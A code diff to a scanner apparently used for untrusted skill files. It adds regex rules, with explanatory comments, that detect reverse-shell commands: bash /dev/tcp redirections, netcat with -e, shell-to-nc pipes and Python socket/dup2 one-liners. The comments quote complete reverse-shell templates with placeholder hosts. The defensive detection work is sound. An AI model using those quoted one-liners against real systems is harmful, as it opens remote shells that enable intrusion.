@@ -67,6 +67,31 @@ DNS_TUNNELING_PATTERNS: PatternList = [
     ),
 ]
 
+# Reverse-shell building blocks. Rules match one line at a time and skill files are untrusted input up to 512 KB, so
+# every window is bounded: an open-ended quantifier behind a repeated prefix would make a rule quadratic in the line.
+_NEAR = r".{0,200}?"
+_DEV_SOCKET = r"/dev/(?:tcp|udp)/"
+# sh/bash/dash/zsh/ksh as a whole word: not ssh, not the tail of run.sh, not a host such as sh.example.com.
+_SHELL_NAME = r"(?:ba|da|z|k)?sh(?![\w.-])"
+_SHELL = r"(?<![\w.-])" + _SHELL_NAME
+_EXEC_TARGET = r"(?:" + _SHELL_NAME + r"|(?:cmd|powershell)(?:\.exe)?(?![\w.-]))"
+_STDIN_FROM_FD = r"\b0<&\d+"
+# Only descriptors above 2 are sockets or pipes; 2>&1 and 2>&2 merely merge streams in ordinary scripts.
+_STDERR_TO_FD = r"\b2>&(?:[3-9]|\d{2,})\b"
+_NET_CLIENT = r"(?:nc|ncat|netcat|telnet|openssl\s+s_client)\b"
+
+# A bash TCP/UDP socket is a legitimate client too (port probes, HTTP requests, "exec 3<>/dev/tcp/h/p"), so these forms
+# demand what only a remote shell does: shell streams redirected to the socket, stdin rewired to it, or stderr sent
+# down a descriptor next to it.
+_BASH_SOCKET_SHELL_FORMS = (
+    r"(?:>&|&>)\s*" + _DEV_SOCKET,  # bash -i >& /dev/tcp/H/P 0>&1
+    r"\b0<\s*" + _DEV_SOCKET,  # exec /bin/sh 0</dev/tcp/H/P 1>&0 2>&0
+    _STDIN_FROM_FD + _NEAR + _DEV_SOCKET,  # 0<&196;exec 196<>/dev/tcp/H/P
+    _DEV_SOCKET + _NEAR + _STDERR_TO_FD,  # exec 5<>/dev/tcp/H/P;cat <&5 | while read line; do $line 2>&5 >&5; done
+    _STDERR_TO_FD + _NEAR + _DEV_SOCKET,  # sh <&5 >&5 2>&5 5<>/dev/tcp/H/P (redirections may trail the command)
+    _SHELL + r"\s+-[a-z]*i\b" + _NEAR + r">\s*" + _DEV_SOCKET,  # bash -i > /dev/tcp/H/P, bash -i 5<> /dev/tcp/H/P
+)
+
 REVERSE_SHELL_PATTERNS: PatternList = [
     (
         re.compile(r"\bnc\s+-[lp]|ncat\s+-[lp]|\bsocat\b", re.IGNORECASE),
@@ -74,13 +99,43 @@ REVERSE_SHELL_PATTERNS: PatternList = [
         ScanSeverity.CRITICAL,
     ),
     (
-        re.compile(r"/bin/(?:ba)?sh\s+-i\s+.*>/dev/tcp/", re.IGNORECASE),
-        "Reverse shell: bash interactive shell via /dev/tcp",
+        # nc -e /bin/sh H P, nc H P -e sh, nc -c sh H P, ncat --sh-exec 'bash -i' H P, nc.exe -e cmd.exe H P
+        re.compile(
+            r"\b(?:nc|ncat|netcat)\b.{0,80}?\s(?:-[a-z]*[ec]|--(?:sh-)?exec)\s+['\"]?(?:\S*/)?" + _EXEC_TARGET,
+            re.IGNORECASE,
+        ),
+        "Reverse shell: netcat/ncat executing a shell on connect",
         ScanSeverity.CRITICAL,
     ),
     (
-        re.compile(r"python[23]?\s+-c\s+[\"']import\s+socket", re.IGNORECASE),
+        re.compile("|".join(_BASH_SOCKET_SHELL_FORMS), re.IGNORECASE),
+        "Reverse shell: bash redirects shell I/O to /dev/tcp or /dev/udp",
+        ScanSeverity.CRITICAL,
+    ),
+    (
+        # rm f;mkfifo f;cat f|sh -i 2>&1|nc H P >f, sh -i 2>&1 | openssl s_client -connect H:P
+        re.compile(_SHELL + r"\s+-[a-z]*i\b[^|]{0,40}\|\s*" + _NET_CLIENT, re.IGNORECASE),
+        "Reverse shell: interactive shell piped into a network client",
+        ScanSeverity.CRITICAL,
+    ),
+    (
+        # nc H P | sh, nc H P </tmp/p | sh >/tmp/p 2>&1, telnet H | bash
+        re.compile(r"\b(?:nc|ncat|netcat|telnet)\s+[\w.-]+[^|]{0,40}\|\s*(?:\S*/)?" + _SHELL_NAME, re.IGNORECASE),
+        "Reverse shell: network client output piped into a shell",
+        ScanSeverity.CRITICAL,
+    ),
+    (
+        # python -c 'import socket,...', python3.11 -u -c "import os,pty,socket;..."
+        re.compile(r"python[\d.]*\s+(?:-\w+\s+)*-c\s+[\"']import\s+(?:\w+\s*,\s*)*socket", re.IGNORECASE),
         "Reverse shell: Python one-liner socket connection",
+        ScanSeverity.CRITICAL,
+    ),
+    (
+        # s=socket.socket();s.connect((H,P));os.dup2(s.fileno(),0);... on one line of a script
+        re.compile(
+            r"\bsocket\b" + _NEAR + r"(?:\.connect|create_connection)\w*\s*\(" + _NEAR + r"\bdup2\s*\(", re.IGNORECASE
+        ),
+        "Reverse shell: Python socket wired to stdio via dup2",
         ScanSeverity.CRITICAL,
     ),
     (
